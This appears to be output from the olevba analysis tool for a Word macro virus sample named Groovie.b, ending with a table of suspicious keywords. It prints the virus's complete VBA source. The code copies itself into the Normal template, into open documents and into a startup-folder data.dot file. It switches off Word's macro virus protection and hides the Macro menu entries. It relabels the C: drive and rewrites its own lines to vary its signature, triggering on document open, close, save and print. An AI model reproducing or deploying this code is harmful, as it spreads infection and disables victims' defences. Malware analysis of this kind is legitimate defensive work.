olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-c51d9703af7e5ad3398d54d747a8071aa62131fb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-c51d9703af7e5ad3398d54d747a8071aa62131fb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO orbit.bas 
in file: Virus.MSWord.Groovie.b-c51d9703af7e5ad3398d54d747a8071aa62131fb - OLE stream: 'Macros/VBA/orbit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 
Public I02 As Boolean
 
Public I03 As Boolean
 
Public I04 As Boolean
 
Public I05 As Boolean
 
Public I06 As String
 
Public I07 As Boolean
 
Public I08 As Boolean
 
Function I09()
 
On Error Resume Next
 
    If MacroContainer = NormalTemplate Then
 
        I01 = "normal"
 
        GoTo checkout
 
    End If
 
    If MacroContainer = ActiveDocument Then I01 = "document"
 
    If MacroContainer = "data.dot" Then I01 = "orbit"
 
checkout:
 
End Function
 
Function I10()
 
On Error Resume Next
 
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
 
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then I04 = True
 
    Next I
 
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
 
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then I03 = True
 
    Next I
 
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 
End Function
 
Function I11()
 
On Error Resume Next
 
Call I09
 
Call I10
 
    If I01 = "document" Then Call I12
 
    If I01 = "normal" Then Call I13
 
    If I01 = "orbit" Then Call I14
 
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 
End Function
 
Function I12()
 
On Error Resume Next
 
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 
    If I03 = False And I05 = False Then
 
        With NormalTemplate.VBProject
 
        With .VBComponents.Import("c:\groovie.sys")
 
        End With
 
        End With
 
    End If
 
    If I02 = False Then
 
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 
        If I08 = False Then Documents.Open FileName:=I06
 
        Shell ("label c: groovie"), 0
 
        Windows(1).Close
 
    End If
 
End Function
 
Function I13()
 
On Error Resume Next
 
Application.ScreenUpdating = False
 
    Call I17
 
    If I04 = False And I07 = True Then
 
        With ActiveDocument.VBProject
 
        With .VBComponents.Import("c:\groovie.sys")
 
        End With
 
        End With
 
        With Dialogs(wdDialogFileSummaryInfo)
 
            .Comments = "ALT-F11 says it's groovie!"
 
            .Execute
 
        End With
 
    End If
 
    If I02 = False And I07 = True Then
 
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 
        If I08 = False Then Documents.Open FileName:=I06
 
        Windows(1).Close SaveChanges:=wdSaveChanges
 
    End If
 
    If I02 = False And I07 = False Then
 
        Documents.Add Template:="", NewTemplate:=False
 
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 
        Windows(1).Close SaveChanges:=wdSaveChanges
 
    End If
 
Application.ScreenUpdating = True
 
End Function
 
Function I14()
 
On Error Resume Next
 
Application.ScreenUpdating = False
 
        If I03 = False And I05 = False Then
 
            With NormalTemplate.VBProject
 
            With .VBComponents.Import("c:\groovie.sys")
 
            End With
 
            End With
 
            NormalTemplate.Save
 
        End If
 
        If I04 = False Then
 
            With ActiveDocument.VBProject
 
            With .VBComponents.Import("c:\groovie.sys")
 
            End With
 
            End With
 
            With Dialogs(wdDialogFileSummaryInfo)
 
                .Comments = "ALT-F11 says it's groovie!"
 
                .Execute
 
            End With
 
        End If
 
Application.ScreenUpdating = True
 
End Function
 
Function I15()
 
On Error Resume Next
 
    Options.VirusProtection = False
 
    Options.SaveNormalPrompt = False
 
    Options.ConfirmConversions = False
 
    I06 = ActiveDocument.FullName
 
    Call I11
 
End Function
 
Sub AutoOpen()
 
On Error Resume Next
 
Call I15
 
End Sub
 
Sub AutoClose()
 
On Error Resume Next
 
I08 = True
 
Call I15
 
End Sub
 
Sub AutoExit()
 
On Error Resume Next
 
Call I15
 
End Sub
 
Sub FileSaveAs()
 
On Error Resume Next
 
Call I16
 
Call I15
 
Dialogs(wdDialogFileSaveAs).Show
 
End Sub
 
Sub filesave()
 
On Error Resume Next
 
Call I16
 
Call I15
 
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 
End Sub
 
Sub fileclose()
 
On Error Resume Next
 
I08 = True
 
Call I15
 
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 
ActiveDocument.Close
 
End Sub
 
Sub fileprint()
 
On Error Resume Next
 
Call I15
 
Dialogs(wdDialogFilePrint).Show
 
End Sub
 
Sub viewvbcode()
 
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 
End Sub
 
Sub ToolsMacro()
 
End Sub
 
Sub FileTemplates()
 
End Sub
 
Function I17()
 
On Error GoTo docek
 
    If ActiveDocument.Name <> "" Then
 
        I07 = True
 
    End If
 
    GoTo over
 
docek:
 
    I07 = False
 
over:
 
End Function
 
Function I16()
 
Randomize
 
rn = Int(Rnd * 999)
 
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 
For x = 2 To 356 Step 2
 
.DeleteLines x
 
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.ActivePrinter
 
Next x
 
End With
 
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

